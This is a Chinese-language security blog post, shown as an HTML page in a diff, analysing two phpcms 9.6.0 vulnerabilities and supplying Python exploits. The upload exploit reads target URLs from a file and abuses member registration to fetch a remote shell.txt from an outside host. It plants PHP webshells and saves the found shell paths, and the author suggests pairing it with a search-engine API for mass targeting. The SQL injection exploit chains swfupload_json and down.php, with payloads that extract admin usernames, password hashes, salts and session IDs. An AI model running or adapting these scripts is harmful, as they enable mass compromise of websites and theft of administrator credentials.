@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"phyb0x.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="前言粗浅的分析下phpcms的几个版本的漏洞，附上exp。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="phpcms9.6.0漏洞分析">
+<meta property="og:url" content="https://phyb0x.github.io/2018/10/02/phpcms9-6-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="p&#39;Blog">
+<meta property="og:description" content="前言粗浅的分析下phpcms的几个版本的漏洞，附上exp。">
+<meta property="og:locale">
+<meta property="og:image" content="https://i.imgur.com/Syrn7AV.png">
+<meta property="og:image" content="https://i.imgur.com/WePRdNn.png">
+<meta property="og:image" content="https://i.imgur.com/U8c7xoO.png">
+<meta property="article:published_time" content="2018-10-02T13:10:22.000Z">
+<meta property="article:modified_time" content="2019-01-19T02:04:42.000Z">
+<meta property="article:author" content="Yumi">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.imgur.com/Syrn7AV.png">
+
+<link rel="canonical" href="https://phyb0x.github.io/2018/10/02/phpcms9-6-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh'
+  };
+</script>
+
+  <title>phpcms9.6.0漏洞分析 | p'Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">p'Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
+    <link itemprop="mainEntityOfPage" href="https://phyb0x.github.io/2018/10/02/phpcms9-6-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/choumei.png">
+      <meta itemprop="name" content="Yumi">
+      <meta itemprop="description" content="Yumi">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="p'Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          phpcms9.6.0漏洞分析
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2018-10-02 21:10:22" itemprop="dateCreated datePublished" datetime="2018-10-02T21:10:22+08:00">2018-10-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-01-19 10:04:42" itemprop="dateModified" datetime="2019-01-19T10:04:42+08:00">2019-01-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>粗浅的分析下phpcms的几个版本的漏洞，附上exp。</p>
+<span id="more"></span>
+
+
+<h3 id="phpcms9-6-0"><a href="#phpcms9-6-0" class="headerlink" title="phpcms9.6.0"></a>phpcms9.6.0</h3><h4 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h4><p>漏洞分析就看这个吧，大佬分析的真的是全面。</p>
+<p><a target="_blank" rel="noopener" href="https://www.hackersb.cn/hacker/219.html">https://www.hackersb.cn/hacker/219.html</a></p>
+<p>这个漏洞产生原因主要是对download函数的过滤不严，在对远程连接地址的过滤可绕过，在9.6.1中已经修复。</p>
+<h5 id="EXP-upload"><a href="#EXP-upload" class="headerlink" title="EXP_upload"></a>EXP_upload</h5><p>网上公布的大部分脚本都是根据页面回显提取shell地址，但是我本地测试的时候并没有爆mysql的错误把地址回显出来，所以只能尝试爆破。<br>    #!/usr/bin/env python<br>    # coding: utf-8<br>    #Authon:phyb0x<br>    #phpcms9.6.0 upload</p>
+<pre><code>import requests
+import time 
+import re
+
+result = []
+def savewebshell(file,list):
+    s = &#39;\n&#39;.join(list)
+    with open(file,&#39;a&#39;) as output:
+        output.write(s)
+
+def poc():
+    fp = open(&quot;url.txt&quot;,&quot;r&quot;)
+    alllines = fp.readlines()
+    fp.close()
+    for eachline in alllines:
+        eachline = eachline.strip()
+        host = eachline
+        try:
+            url =&quot;&#123;&#125;index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1&quot;.format(host)
+            shell = &#39;&#39;
+            data = &#123;
+                &#39;siteid&#39;:&#39;1&#39;,
+                &#39;modelid&#39;:&#39;11&#39;,
+                &#39;username&#39;:&#39;t3esht123&#39;,
+                &#39;password&#39;:&#39;t3esht123&#39;,
+                &#39;email&#39;:&#39;tdehst@qq.com&#39;,
+                &#39;info[content]&#39;:&#39;&lt;img src=http://www.blogsir.com.cn/lj_ctf/shell.txt?.php#.jpg&gt;&#39;,
+                &#39;dosubmit&#39;:&#39;1&#39;&#125;
+
+            nowtime = time.strftime(&#39;%Y%m%d%I%M%S&#39;)
+            nowtime = nowtime[:13]
+            req = requests.post(url=url,data=data)
+            path = &#39;uploadfile/&#39; + time.strftime(&quot;%Y&quot;) +&#39;/&#39;+ time.strftime(&quot;%m%d&quot;) + &#39;/&#39;
+            for i in range(0000,9999):
+                filename = nowtime + str(i) +&#39;.php&#39;
+                shell = host + path + filename
+                req = requests.get(url=shell)
+                if req.status_code == 200:
+                    global result
+                    result.append(shell)
+                    print(&#39;shell:&#39;,shell)
+                    break
+                else:
+                    print(&#39;NO BUG&#39;)
+                    break
+        except Exception as a:
+            print(&#39;Request Bad&#39;)            
+
+if __name__ == &#39;__main__&#39;:
+    poc()
+    savewebshell(&#39;webshell.txt&#39;,result)
+</code></pre>
+<p>可以结合我github上的zoomeye_api配合使用，不过好像不太好用…..</p>
+<h4 id="sqli"><a href="#sqli" class="headerlink" title="sqli"></a>sqli</h4><p>漏洞的出发点在phpcms\modules\content\down.php</p>
+<pre><code>public function init() &#123;
+    $a_k = trim($_GET[&#39;a_k&#39;]); //get获取变量
+    if(!isset($a_k)) showmessage(L(&#39;illegal_parameters&#39;));
+    $a_k = sys_auth($a_k, &#39;DECODE&#39;, pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;));//对参数进行解密
+    if(empty($a_k)) showmessage(L(&#39;illegal_parameters&#39;));
+    unset($i,$m,$f);
+    parse_str($a_k);//将字符串解析到变量
+    if(isset($i)) $i = $id = intval($i);
+    if(!isset($m)) showmessage(L(&#39;illegal_parameters&#39;));
+    if(!isset($modelid)||!isset($catid)) showmessage(L(&#39;illegal_parameters&#39;));
+    if(empty($f)) showmessage(L(&#39;url_invalid&#39;));
+    $allow_visitor = 1;
+    $MODEL = getcache(&#39;model&#39;,&#39;commons&#39;);
+    $tablename = $this-&gt;db-&gt;table_name = $this-&gt;db-&gt;db_tablepre.$MODEL[$modelid][&#39;tablename&#39;];
+    $this-&gt;db-&gt;table_name = $tablename.&#39;_data&#39;;
+  ***    $rs = $this-&gt;db-&gt;get_one(array(&#39;id&#39;=&gt;$id));    //进行sql查询
+    $siteids = getcache(&#39;category_content&#39;,&#39;commons&#39;);
+    $siteid = $siteids[$catid];
+    $CATEGORYS = getcache(&#39;category_content_&#39;.$siteid,&#39;commons&#39;);
+
+    $this-&gt;category = $CATEGORYS[$catid];
+    $this-&gt;category_setting = string2array($this-&gt;category[&#39;setting&#39;]);
+    ——————省略——————
+</code></pre>
+<p>整个流程就是先获取参数然后调用sys_auth进行’DECODE’解密，parse_str()解析变量最后也是最重要的get_one把id参数代入sql。</p>
+<p>这里漏洞产生还有一个原因，看大佬分析这里parse_str()会解析url编码，所以代入sql的payload才会被执行。不过我觉得这里只能算是php的一个特性吧，算是函数使用不当，毕竟没有进行任何操作解密后就直接把参数代入查询怎么看也是最大的锅！</p>
+<p>phpcms\libs\classes\acccess.class.php 第50行</p>
+<pre><code>function get_one($query) &#123;
+    $this-&gt;querynum++;
+    $rs = $this-&gt;conn-&gt;Execute($query);
+     $r = $this-&gt;fetch_array($rs);
+    $this-&gt;free_result($rs);
+    return $r;
+&#125;
+</code></pre>
+<p>到现在很明确，我们要把payload加密整合到$a_k中的id参数才能利用。<br>而且秘钥我们并没有,要利用目标phpcms站点进行在线加密把加密后的payload回显出来，还有几个前置条件:</p>
+<pre><code>$i为空
+$m不为空
+$modelid 且 $catid 不为空
+$f不为空
+</code></pre>
+<p>phpcms\modules\attachment\attachments.php 第239行</p>
+<pre><code>    public function swfupload_json() &#123;
+    $arr[&#39;aid&#39;] = intval($_GET[&#39;aid&#39;]);
+    $arr[&#39;src&#39;] = safe_replace(trim($_GET[&#39;src&#39;]));
+    $arr[&#39;filename&#39;] = urlencode(safe_replace($_GET[&#39;filename&#39;]));
+    $json_str = json_encode($arr);
+    $att_arr_exist = param::get_cookie(&#39;att_json&#39;);
+    $att_arr_exist_tmp = explode(&#39;||&#39;, $att_arr_exist);
+    if(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) &#123;
+        return true;
+    &#125; else &#123;
+        $json_str = $att_arr_exist ? $att_arr_exist.&#39;||&#39;.$json_str : $json_str;
+        param::set_cookie(&#39;att_json&#39;,$json_str);
+        return true;            
+    &#125;
+&#125;
+</code></pre>
+<p>这里主要涉及三个函数，safe_replace、get_cookie、set_cookie</p>
+<p>phpcms\libs\param.class.php 86行</p>
+<pre><code>public static function set_cookie($var, $value = &#39;&#39;, $time = 0) &#123;
+    $time = $time &gt; 0 ? $time : ($value == &#39;&#39; ? SYS_TIME - 3600 : 0);
+    $s = $_SERVER[&#39;SERVER_PORT&#39;] == &#39;443&#39; ? 1 : 0;
+    $var = pc_base::load_config(&#39;system&#39;,&#39;cookie_pre&#39;).$var;
+    $_COOKIE[$var] = $value;
+    if (is_array($value)) &#123;
+        foreach($value as $k=&gt;$v) &#123;
+            setcookie($var.&#39;[&#39;.$k.&#39;]&#39;, sys_auth($v, &#39;ENCODE&#39;), $time, pc_base::load_config(&#39;system&#39;,&#39;cookie_path&#39;), pc_base::load_config(&#39;system&#39;,&#39;cookie_domain&#39;), $s);
+        &#125;
+    &#125; else &#123;
+        setcookie($var, sys_auth($value, &#39;ENCODE&#39;), $time, pc_base::load_config(&#39;system&#39;,&#39;cookie_path&#39;), pc_base::load_config(&#39;system&#39;,&#39;cookie_domain&#39;), $s);
+    &#125;
+&#125;
+</code></pre>
+<p>这里可以看到set_cookie调用了sys_auth加密函数，同理get_cookie调用解密。在函数中我们可以看到att_json作为键值 json_str(aid、src、filename)作为值传入cookie中加密，而且src参数只进行safe_replace，也就是说我们可以把payload传入src参数到set_cookie中去加密。</p>
+<pre><code>function safe_replace($string) &#123;
+$string = str_replace(&#39;%20&#39;,&#39;&#39;,$string);
+$string = str_replace(&#39;%27&#39;,&#39;&#39;,$string);
+$string = str_replace(&#39;%2527&#39;,&#39;&#39;,$string);
+$string = str_replace(&#39;*&#39;,&#39;&#39;,$string);
+$string = str_replace(&#39;&quot;&#39;,&#39;&quot;&#39;,$string);
+$string = str_replace(&quot;&#39;&quot;,&#39;&#39;,$string);
+$string = str_replace(&#39;&quot;&#39;,&#39;&#39;,$string);
+$string = str_replace(&#39;;&#39;,&#39;&#39;,$string);
+$string = str_replace(&#39;&lt;&#39;,&#39;&lt;&#39;,$string);
+$string = str_replace(&#39;&gt;&#39;,&#39;&gt;&#39;,$string);
+$string = str_replace(&quot;&#123;&quot;,&#39;&#39;,$string);
+$string = str_replace(&#39;&#125;&#39;,&#39;&#39;,$string);
+$string = str_replace(&#39;\\&#39;,&#39;&#39;,$string);
+return $string;
+&#125;
+</code></pre>
+<p>不多说很好进行绕过了吧。不过如果我们直接访问访问不到swfupload_json()，这里有一个构造函数如果cookie的_userid或者表单userid_flash的值为空会跳转到主页。所以我们要先获取cookie</p>
+<pre><code>    $this-&gt;db = pc_base::load_model(&#39;content_model&#39;);
+    $this-&gt;siteid = isset($_GET[&#39;siteid&#39;]) &amp;&amp; (intval($_GET[&#39;siteid&#39;]) &gt; 0) ? intval(trim($_GET[&#39;siteid&#39;])) : (param::get_cookie(&#39;siteid&#39;) ? param::get_cookie(&#39;siteid&#39;) : 1);
+    param::set_cookie(&#39;siteid&#39;,$this-&gt;siteid);    
+    $this-&gt;wap_site = getcache(&#39;wap_site&#39;,&#39;wap&#39;);
+    $this-&gt;types = getcache(&#39;wap_type&#39;,&#39;wap&#39;);
+    $this-&gt;wap = $this-&gt;wap_site[$this-&gt;siteid];
+    define(&#39;WAP_SITEURL&#39;, $this-&gt;wap[&#39;domain&#39;] ? $this-&gt;wap[&#39;domain&#39;].&#39;index.php?&#39; : APP_PATH.&#39;index.php?m=wap&amp;siteid=&#39;.$this-&gt;siteid);
+    if($this-&gt;wap[&#39;status&#39;]!=1) exit(L(&#39;wap_close_status&#39;));
+</code></pre>
+<p>可以看到set_cookie函数把value代入cookie满足条件。</p>
+<h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>第一步：访问index.php?m=wap 获取userid_flash的值(wap模块开不开启都能获取)</p>
+<p><img src="https://i.imgur.com/Syrn7AV.png"></p>
+<p>第二步:</p>
+<p><img src="https://i.imgur.com/WePRdNn.png"></p>
+<p>可以看到利用swfupload_json把src=%26id%3d%2*7and%20updatexml(1,concat(1,(user())),1)%23%26m%3d1%26modelid%3d1%26catid%3d1%26f%3d1 进行加密处理并回显出来。</p>
+<p>第三步:</p>
+<p><img src="https://i.imgur.com/U8c7xoO.png"></p>
+<p>用GET方法提交赋予加密payload的$a_k，注入成功。</p>
+<h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><pre><code>import requests
+import urllib
+import re
+
+def poc(url):
+    step1 = &#39;&#123;&#125;/index.php?m=wap&amp;a=index&amp;siteid=1&#39;.format(url)
+    req = requests.get(url=step1)
+    for i in req.cookies:
+        if i.name[-7:] == &#39;_siteid&#39;:
+            userid_flash = i.value
+        else:
+            print(&#39;Step1 is error&#39;)
+
+    #payload =&#39;&amp;id=%*27 and updatexml(1,concat(1,(select concat(username,0x3a,encrypt) from v9_admin)),1)%23&amp;modelid=1&amp;catid=1&amp;m=1&amp;f=&#39;
+    #payload=&quot;&amp;id=%*27 and updatexml(1,concat(1,(select concat(0x3a,password,0x3a) from v9_admin)),1)%23&amp;modelid=1&amp;catid=1&amp;m=1&amp;f=&quot;
+    #payload=&quot;&amp;id=%*27 and updatexml(1,concat(1,(select concat(0x706f6374657374,username,0x23,password,0x3a,encrypt,0x706f6374657374) from v9_admin)),1)%23&amp;modelid=1&amp;catid=1&amp;m=1&amp;f=&quot;
+    #payload =&#39;&amp;id=%*27 and updatexml(1,concat(1,(select concat(sessionid) from v9_session)),1)%23&amp;modelid=1&amp;catid=1&amp;m=1&amp;f=&#39;
+
+    payload =urllib.parse.quote(payload)
+    step2 = &quot;&#123;&#125;/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=&#123;&#125;&quot;.format(url,payload)
+    data = &#123;&#39;userid_flash&#39;:userid_flash&#125;
+    req2 = requests.post(url=step2,data=data)
+    for i in req2.cookies:
+        if i.name[-9:] == &#39;_att_json&#39;:
+            a_k = i.value
+    if a_k == &#39;&#39;:
+        print(&#39;sys_paylaod Bad&#39;)
+
+    step3 = &quot;&#123;&#125;/index.php?m=content&amp;c=down&amp;a_k=&#123;&#125;&quot;.format(url,a_k)
+    req3 = requests.get(url=step3)
+    if &#39;MySQL Error&#39; in req3.text:
+        result = re.findall(r&quot;MySQL Error : &lt;/b&gt;XPATH syntax error: &#39;(.*?)&#39; &lt;br /&gt; &lt;b&gt;MySQL Errno&quot;,req3.text)
+        print(result)
+
+if __name__ == &#39;__main__&#39;:
+    poc(&#39;http://localhost/phpcms9.6.0/&#39;)
+</code></pre>
+<p>这个出的密码加盐的，要解密，据说可以直接获取session但是我简单试 一下没成。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>还有后续，带着猫儿去绝育结果打了麻药尿血，自己之前也没发现。好烦还要出题，十一愉快吧。</p>
+<p>参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/201">https://xz.aliyun.com/t/201</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.waitalone.cn/phpcmsv96-sql-getshell.html">https://www.waitalone.cn/phpcmsv96-sql-getshell.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.kingkk.com/2018/07/phpcms-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1">https://www.kingkk.com/2018/07/phpcms-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2018/09/22/win%E6%8F%90%E6%9D%83/" rel="prev" title="win提权">
+      <i class="fa fa-chevron-left"></i> win提权
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2018/10/04/phpmyadmin%E6%8F%90%E6%9D%83/" rel="next" title="phpmyadmin提权">
+      phpmyadmin提权 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phpcms9-6-0"><span class="nav-number">2.</span> <span class="nav-text">phpcms9.6.0</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#upload"><span class="nav-number">2.1.</span> <span class="nav-text">upload</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#EXP-upload"><span class="nav-number">2.1.1.</span> <span class="nav-text">EXP_upload</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sqli"><span class="nav-number">2.2.</span> <span class="nav-text">sqli</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">2.2.1.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#EXP"><span class="nav-number">2.2.2.</span> <span class="nav-text">EXP</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Yumi"
+      src="/images/choumei.png">
+  <p class="site-author-name" itemprop="name">Yumi</p>
+  <div class="site-description" itemprop="description">Yumi</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">29</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Yumi</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
